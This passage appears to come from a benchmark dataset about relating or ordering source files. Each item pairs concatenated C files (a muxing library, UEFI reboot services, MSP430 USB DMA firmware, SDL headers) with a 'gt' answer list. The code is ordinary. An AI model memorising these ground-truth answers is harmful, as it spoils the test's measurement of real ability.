enc_map_size;\n\n    int *stream_has_link;\n    enum AVCodecID *stream_codec_id;\n\n    int err;\n} MuxingContext;\n\nAVBufferRef *sp_muxer_alloc(void);\nint  sp_muxer_init(AVBufferRef *ctx_ref);\nint  sp_muxer_add_stream(MuxingContext *ctx, EncodingContext *enc);\nint  sp_muxer_ctrl(AVBufferRef *ctx_ref, SPEventType ctrl, void *arg);\n\n'txproto/src/include/libtxproto/fifo_frame.h'\n:\n\n#pragma once\n\n#include <assert.h>\n#include <libavutil/frame.h>\n\nenum SPFrameFIFOFlags {\n    FRAME_FIFO_BLOCK_MAX_OUTPUT = (1 << 0),\n    FRAME_FIFO_BLOCK_NO_INPUT   = (1 << 1),\n    FRAME_FIFO_PULL_NO_BLOCK    = (1 << 2),\n};\n\n#define FRENAME(x) FRAME_FIFO_ ## x\n#define RENAME(x)  sp_frame_ ##x\n#define FNAME      enum SPFrameFIFOFlags\n#define TYPE       AVFrame\n\n\nAVBufferRef *RENAME(fifo_create)(void *opaque, int max_queued, FNAME block_flags);\nAVBufferRef *RENAME(fifo_ref)(AVBufferRef *src, int max_queued, FNAME block_flags);\n\n\nint RENAME(fifo_is_full)(AVBufferRef *src);\nint RENAME(fifo_get_size)(AVBufferRef *src);\nint RENAME(fifo_get_max_size)(AVBufferRef *src);\n\n\nvoid RENAME(fifo_set_max_queued)(AVBufferRef *dst, int max_queued);\nvoid RENAME(fifo_set_block_flags)(AVBufferRef *dst, FNAME block_flags);\nint  RENAME(fifo_string_to_block_flags)(FNAME *dst, const char *in_str);\n\n\nint RENAME(fifo_mirror)(AVBufferRef *dst, AVBufferRef *src);\nint RENAME(fifo_unmirror)(AVBufferRef *dst, AVBufferRef *src);\nint RENAME(fifo_unmirror_all)(AVBufferRef *dst);\n\n\nint   RENAME(fifo_push)(AVBufferRef *dst, TYPE *in);\nTYPE *RENAME(fifo_pop)(AVBufferRef *src);\nint   RENAME(fifo_pop_flags)(AVBufferRef *src, TYPE **ret, FNAME flags);\nTYPE *RENAME(fifo_peek)(AVBufferRef *src);\n\n#undef TYPE\n#undef FNAME\n#undef RENAME\n#undef FRENAME\n\ntypedef enum SPRotation {\n    ROTATION_IDENTITY = 0,\n    ROTATION_ROTATE90,\n    ROTATION_ROTATE180,\n    ROTATION_ROTATE270,\n} SPRotation;\n\n\ntypedef struct FormatExtraData {\n    AVRational avg_frame_rate;\n    int bits_per_sample;\n    AVRational time_base;\n    SPRotation rotation;\n} FormatExtraData;\n",
        "gt": [
            "'txproto/src/include/libtxproto/fifo_frame.h'",
            "'txproto/src/include/libtxproto/encode.h'",
            "'txproto/src/include/libtxproto/mux.h'",
            "'txproto/src/control.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/ShutdownServices.c'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'\n:\n\n#ifndef __EFIRESETREASON_H__\n#define __EFIRESETREASON_H__\n\n\ntypedef struct _EFI_RESETREASON_PROTOCOL EFI_RESETREASON_PROTOCOL;\n\n\n\n\n#define EFI_RESETREASON_PROTOCOL_REVISION 0x0000000000010002\n\n\n\n\n#define EFI_RESETREASON_PROTOCOL_GUID                                          \\\n  {                                                                            \\\n    0xA022155A, 0x4828, 0x4535,                                                \\\n    {                                                                          \\\n      0xA4, 0x99,                                                              \\\n      {                                                                        \\\n        0x11, 0xF1, 0x52, 0x40, 0xB9, 0x1B                                     \\\n      }                                                                        \\\n    }                                                                          \\\n  }\n\n#define STR_RESET_PARAM L\"RESET_PARAM\"\n#define STR_RESET_UNKNOWN L\"UNKNOWN\"\n#define STR_RESET_PLAT_SPECIFIC_EDL L\"EDL\"\n\n\n\n\n\nextern EFI_GUID gEfiResetReasonProtocolGuid;\n\n\n\n\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_RESETREASON_GETRESETREASON) (\n    IN EFI_RESETREASON_PROTOCOL *This,\n    IN OUT UINT32 *ResetReason,\n    IN OUT CHAR16 *ResetReasonString OPTIONAL,\n    IN OUT UINT32 *ResetReasonStrLen OPTIONAL);\n\n\n\ntypedef EFI_STATUS (EFIAPI *EFI_RESETREASON_CLEARRESETREASON) (\n    IN EFI_RESETREASON_PROTOCOL *This);\n\n\n\nstruct _EFI_RESETREASON_PROTOCOL {\n  UINT64 Revision;\n  EFI_RESETREASON_GETRESETREASON GetResetReason;\n  EFI_RESETREASON_CLEARRESETREASON ClearResetReason;\n};\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'\n:\n\n#ifndef __BDS_INTERNAL_H__\n#define __BDS_INTERNAL_H__\n\n#include <PiDxe.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/HobLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PerformanceLib.h>\n#include <Library/PrintLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n\n#include <Protocol/DevicePath.h>\n#include <Protocol/DevicePathFromText.h>\n#include <Protocol/EFIResetReason.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadFile.h>\n#include <Protocol/PxeBaseCode.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Uefi.h>\n\n\ntypedef enum {\n\n  NORMAL_MODE = 0x0,\n  RECOVERY_MODE = 0x1,\n  FASTBOOT_MODE = 0x2,\n  ALARM_BOOT = 0x3,\n  DM_VERITY_LOGGING = 0x4,\n  DM_VERITY_ENFORCING = 0x5,\n  DM_VERITY_KEYSCLEAR = 0x6,\n  OEM_RESET_MIN = 0x20,\n  OEM_RESET_MAX = 0x3f,\n  EMERGENCY_DLOAD = 0xFF,\n} RebootReasonType;\n\ntypedef struct {\n  CHAR16 DataBuffer[12];\n  UINT8 Bdata;\n} __attribute ((__packed__)) ResetDataType;\n\n\nEFI_STATUS\nShutdownUefiBootServices (VOID);\n\nEFI_STATUS PreparePlatformHardware (VOID);\nVOID\nRebootDevice (UINT8 RebootReason);\nVOID ShutdownDevice (VOID);\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/ShutdownServices.c'\n:\n\n#include \"ShutdownServices.h\"\n\n#include <FastbootLib/FastbootCmds.h>\n#include <Guid/ArmMpCoreInfo.h>\n#include <Guid/FileInfo.h>\n#include <Guid/GlobalVariable.h>\n#include <Library/ArmLib.h>\n#include <Library/DxeServicesTableLib.h>\n#include <Library/HobLib.h>\n#include <Library/LinuxLoaderLib.h>\n#include <Library/PrintLib.h>\n#include <Library/SerialPortLib.h>\n#include <Library/TimerLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n\nEFI_STATUS ShutdownUefiBootServices (VOID)\n{\n  EFI_STATUS Status;\n  UINTN MemoryMapSize;\n  EFI_MEMORY_DESCRIPTOR *MemoryMap;\n  UINTN MapKey;\n  UINTN DescriptorSize;\n  UINT32 DescriptorVersion;\n  UINTN Pages;\n\n  WaitForFlashFinished ();\n\n  MemoryMap = NULL;\n  MemoryMapSize = 0;\n  Pages = 0;\n\n  do {\n    Status = gBS->GetMemoryMap (&MemoryMapSize, MemoryMap, &MapKey,\n                                &DescriptorSize, &DescriptorVersion);\n    if (Status == EFI_BUFFER_TOO_SMALL) {\n\n      Pages = EFI_SIZE_TO_PAGES (MemoryMapSize) + 1;\n      MemoryMap = AllocatePages (Pages);\n      if (!MemoryMap) {\n        DEBUG ((EFI_D_ERROR, \"Failed to allocate pages for memory map\\n\"));\n        return EFI_OUT_OF_RESOURCES;\n      }\n\n\n\n\n      Status = gBS->GetMemoryMap (&MemoryMapSize, MemoryMap, &MapKey,\n                                  &DescriptorSize, &DescriptorVersion);\n    }\n\n\n    if (!EFI_ERROR (Status)) {\n      Status = gBS->ExitBootServices (gImageHandle, MapKey);\n      if (EFI_ERROR (Status)) {\n        FreePages (MemoryMap, Pages);\n        MemoryMap = NULL;\n        MemoryMapSize = 0;\n      }\n    }\n  } while (EFI_ERROR (Status));\n\n  return Status;\n}\n\nEFI_STATUS PreparePlatformHardware (VOID)\n{\n  ArmDisableBranchPrediction ();\n\n\n  ArmDisableInterrupts ();\n  ArmDisableAsynchronousAbort ();\n\n\n  WriteBackInvalidateDataCache ();\n  InvalidateInstructionCache ();\n\n  ArmDisableDataCache ();\n  ArmDisableInstructionCache ();\n  ArmDisableMmu ();\n  ArmInvalidateTlb ();\n  return EFI_SUCCESS;\n}\n\nVOID\nRebootDevice (UINT8 RebootReason)\n{\n  ResetDataType ResetData;\n  EFI_STATUS Status = EFI_INVALID_PARAMETER;\n\n  WaitForFlashFinished ();\n\n  StrnCpyS (ResetData.DataBuffer, ARRAY_SIZE (ResetData.DataBuffer),\n            (CONST CHAR16 *)STR_RESET_PARAM, ARRAY_SIZE (STR_RESET_PARAM) - 1);\n  ResetData.Bdata = RebootReason;\n  if (RebootReason == NORMAL_MODE)\n    Status = EFI_SUCCESS;\n\n  if (RebootReason == EMERGENCY_DLOAD)\n    gRT->ResetSystem (EfiResetPlatformSpecific, EFI_SUCCESS,\n                      StrSize ((CONST CHAR16 *)STR_RESET_PLAT_SPECIFIC_EDL),\n                      STR_RESET_PLAT_SPECIFIC_EDL);\n\n  gRT->ResetSystem (EfiResetCold, Status, sizeof (ResetDataType),\n                    (VOID *)&ResetData);\n}\n\nVOID ShutdownDevice (VOID)\n{\n  EFI_STATUS Status = EFI_INVALID_PARAMETER;\n\n  WaitForFlashFinished ();\n\n  gRT->ResetSystem (EfiResetShutdown, Status, 0, NULL);\n\n\n  ASSERT (0);\n}\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFIResetReason.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/ShutdownServices.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/ShutdownServices.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/USB_API/USB_Common/usbdma.c'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/pmm.h'"
        ],
        "content": "'KFDtool/fw/KFDtool/USB_API/USB_Common/usbdma.c'\n:\n\n\n\n\n\n#include <string.h>\n\n#include \"driverlib.h\"\n\n#include \"../USB_Common/device.h\"\n#include \"../USB_Common/defMSP430USB.h\"\n#include <descriptors.h>\n#include <string.h>\n\n#ifdef __REGISTER_MODEL__\n\n#   if __REGISTER_MODEL__ == __REGISTER_MODEL_REG20__\n#       define __DMA_ACCESS_REG__ (void __data20 *)\n#   else\n#       define __DMA_ACCESS_REG__ (uint16_t)\n#   endif\n#else\n\n#   define __DMA_ACCESS_REG__ (__SFR_FARPTR)(uint32_t)\n#endif\n\n\nvoid *(*USB_TX_memcpy)(void * dest, const void * source, size_t count);\nvoid *(*USB_RX_memcpy)(void * dest, const void * source, size_t count);\n\nvoid * memcpyDMA0 (void * dest, const void * source, size_t count);\nvoid * memcpyDMA1 (void * dest, const void * source, size_t count);\nvoid * memcpyDMA2 (void * dest, const void * source, size_t count);\n\n\nvoid * memcpyV (void * dest, const void * source, size_t count)\n{\n    uint16_t i;\n    volatile uint8_t bTmp;\n\n    for (i = 0; i < count; i++)\n    {\n        bTmp = *((uint8_t*)source + i);\n        *((uint8_t*)dest  + i) = bTmp;\n    }\n    return (dest);\n}\n\nvoid * memcpyDMA (void * dest, const void *  source, size_t count)\n{\n    if (count == 0){\n        return (dest);\n    }\n\n\n\n    DMA_disableTransferDuringReadModifyWrite();\n    DMA_setSrcAddress(USB_DMA_CHAN, (uint32_t)source, DMA_DIRECTION_INCREMENT);\n    DMA_setDstAddress(USB_DMA_CHAN, (uint32_t)dest, DMA_DIRECTION_INCREMENT);\n\n\n    DMA_enableTransferDuringReadModifyWrite();\n    DMA_setTransferSize(USB_DMA_CHAN, count);\n    DMA_enableTransfers(USB_DMA_CHAN);\n    DMA_startTransfer(USB_DMA_CHAN);\n\n    while (DMA_getInterruptStatus(USB_DMA_CHAN) == DMA_INT_INACTIVE);\n\n    DMA_disableTransfers(USB_DMA_CHAN);\n    return (dest);\n}\n\n\nvoid USB_initMemcpy (void)\n{\n\n    DMA_initParam dmaParams = {0};\n\tdmaParams.channelSelect = USB_DMA_CHAN;\n\tdmaParams.transferModeSelect = DMA_TRANSFER_BLOCK;\n\tdmaParams.transferSize = 0;\n\tdmaParams.triggerSourceSelect = DMA_TRIGGERSOURCE_0;\n\tdmaParams.transferUnitSelect = DMA_SIZE_SRCBYTE_DSTBYTE;\n\tdmaParams.triggerTypeSelect = DMA_TRIGGER_HIGH;\n\n    USB_TX_memcpy = memcpyV;\n    USB_RX_memcpy = memcpyV;\n\n    if (USB_DMA_CHAN != 0xFF) {\n    \tDMA_init(&dmaParams);\n        USB_TX_memcpy = memcpyDMA;\n        USB_RX_memcpy = memcpyDMA;\n    }\n}\n\n\n\n\n\n\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/pmm.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_PMM_H__\n\n#define __MSP430WARE_PMM_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_PMM__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define PMM_CORE_LEVEL_0                                             PMMCOREV_0\n\n#define PMM_CORE_LEVEL_1                                             PMMCOREV_1\n\n#define PMM_CORE_LEVEL_2                                             PMMCOREV_2\n\n#define PMM_CORE_LEVEL_3                                             PMMCOREV_3\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define PMM_SVSMLDLYIFG                                             SVSMLDLYIFG\n\n#define PMM_SVMLIFG                                                     SVMLIFG\n\n#define PMM_SVMLVLRIFG                                               SVMLVLRIFG\n\n#define PMM_SVSMHDLYIFG                                             SVSMHDLYIFG\n\n#define PMM_SVMHIFG                                                     SVMHIFG\n\n#define PMM_SVMHVLRIFG                                               SVMHVLRIFG\n\n#define PMM_PMMBORIFG                                                 PMMBORIFG\n\n#define PMM_PMMRSTIFG                                                 PMMRSTIFG\n\n#define PMM_PMMPORIFG                                                 PMMPORIFG\n\n#define PMM_SVSHIFG                                                     SVSHIFG\n\n#define PMM_SVSLIFG                                                     SVSLIFG\n\n#define PMM_PMMLPM5IFG                                               PMMLPM5IFG\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvmL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvmL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvmH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvmH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsLSvmL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsLSvmL(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsHSvmH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsHSvmH(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsLReset(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsLReset(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvmLInterrupt(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvmLInterrupt(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsHReset(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsHReset(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvmHInterrupt(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvmHInterrupt(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_clearPMMIFGS(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsLInLPMFastWake(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsLInLPMSlowWake(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsLInLPMFastWake(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsLInLPMSlowWake(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsHInLPMNormPerf(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_enableSvsHInLPMFullPerf(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsHInLPMNormPerf(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_disableSvsHInLPMFullPerf(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_optimizeSvsLInLPMFastWake(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void PMM_optimizeSvsHInLPMFullPerf(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t PMM_setVCoreUp(uint8_t level);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t PMM_setVCoreDown(uint8_t level);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern bool PMM_setVCore(uint8_t level);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t PMM_getInterruptStatus(uint16_t mask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/pmm.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/USB_API/USB_Common/usbdma.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_keyboard.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'\n:\n\n\n\n#ifndef _SDL_system_h\n#define _SDL_system_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_keyboard.h\"\n#include \"SDL_render.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#ifdef __WIN32__\n\n\ntypedef void (SDLCALL * SDL_WindowsMessageHook)(void *userdata, void *hWnd, unsigned int message, Uint64 wParam, Sint64 lParam);\nextern DECLSPEC void SDLCALL SDL_SetWindowsMessageHook(SDL_WindowsMessageHook callback, void *userdata);\n\n\nextern DECLSPEC int SDLCALL SDL_Direct3D9GetAdapterIndex( int displayIndex );\n\ntypedef struct IDirect3DDevice9 IDirect3DDevice9;\n\nextern DECLSPEC IDirect3DDevice9* SDLCALL SDL_RenderGetD3D9Device(SDL_Renderer * renderer);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_DXGIGetOutputInfo( int displayIndex, int *adapterIndex, int *outputIndex );\n\n#endif\n\n\n\n#if defined(__IPHONEOS__) && __IPHONEOS__\n\n#define SDL_iOSSetAnimationCallback(window, interval, callback, callbackParam) SDL_iPhoneSetAnimationCallback(window, interval, callback, callbackParam)\nextern DECLSPEC int SDLCALL SDL_iPhoneSetAnimationCallback(SDL_Window * window, int interval, void (*callback)(void*), void *callbackParam);\n\n#define SDL_iOSSetEventPump(enabled) SDL_iPhoneSetEventPump(enabled)\nextern DECLSPEC void SDLCALL SDL_iPhoneSetEventPump(SDL_bool enabled);\n\n#endif\n\n\n\n#if defined(__ANDROID__) && __ANDROID__\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetJNIEnv();\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetActivity();\n\n\n#define SDL_ANDROID_EXTERNAL_STORAGE_READ   0x01\n#define SDL_ANDROID_EXTERNAL_STORAGE_WRITE  0x02\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetInternalStoragePath();\n\n\nextern DECLSPEC int SDLCALL SDL_AndroidGetExternalStorageState();\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetExternalStoragePath();\n\n#endif\n\n\n#if defined(__WINRT__) && __WINRT__\n\n\ntypedef enum\n{\n\n    SDL_WINRT_PATH_INSTALLED_LOCATION,\n\n\n    SDL_WINRT_PATH_LOCAL_FOLDER,\n\n\n    SDL_WINRT_PATH_ROAMING_FOLDER,\n\n\n    SDL_WINRT_PATH_TEMP_FOLDER\n} SDL_WinRT_Path;\n\n\n\nextern DECLSPEC const wchar_t * SDLCALL SDL_WinRTGetFSPathUNICODE(SDL_WinRT_Path pathType);\n\n\nextern DECLSPEC const char * SDLCALL SDL_WinRTGetFSPathUTF8(SDL_WinRT_Path pathType);\n\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_keyboard.h'\n:\n\n\n\n#ifndef _SDL_keyboard_h\n#define _SDL_keyboard_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n#include \"SDL_keycode.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDL_Keysym\n{\n    SDL_Scancode scancode;\n    SDL_Keycode sym;\n    Uint16 mod;\n    Uint32 unused;\n} SDL_Keysym;\n\n\n\n\nextern DECLSPEC SDL_Window * SDLCALL SDL_GetKeyboardFocus(void);\n\n\nextern DECLSPEC const 